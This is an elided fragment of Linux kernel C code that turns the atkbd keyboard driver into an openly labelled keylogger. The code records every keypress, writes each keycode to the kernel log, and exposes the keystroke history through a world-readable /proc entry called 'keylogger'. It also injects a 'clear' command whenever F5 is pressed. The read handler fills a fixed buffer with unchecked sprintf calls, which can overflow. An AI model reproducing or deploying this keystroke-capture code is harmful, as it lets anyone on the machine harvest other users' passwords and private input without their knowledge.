...
#define MAX_KEY_BUFFER 69
int key_history[MAX_KEY_BUFFER];
int to_read = 0;
int to_write = 0;
...
{
	// printk(KERN_INFO "damn ur literate??\n");
	char buffer[420] = "";
	int buffer_length;
	while (to_read != to_write) {
		sprintf(buffer + strlen(buffer), "%d ", key_history[to_read]);
		to_read++;
		to_read %= MAX_KEY_BUFFER;
	}
	...
	copy_to_user(user_buffer, buffer, buffer_length);
				   ...
				   unsigned int flags)
{
	...
	if (!(atkbd->release)) {
		printk(KERN_INFO "keylogger: %d\n", code);

		key_history[to_write] = code;

		to_write++;
		to_write %= MAX_KEY_BUFFER;



		if (code == KEY_F5) {
			int clear_cmd[] = {KEY_C, KEY_L, KEY_E, KEY_A, KEY_R, KEY_ENTER};
			int clear_len = sizeof(clear_cmd) / sizeof(clear_cmd[0]);
			int i;

			printk(KERN_INFO "F5 pressed, initiating clear\n");

			i = 0;
			while (i < clear_len) {
				input_report_key(dev, clear_cmd[i], 1);
				input_sync(dev);

				input_report_key(dev, clear_cmd[i], 0);
				input_sync(dev);
...
static int __init atkbd_init(void)
{
	...
	proc_entry = proc_create("keylogger", 0666, NULL, &fops);
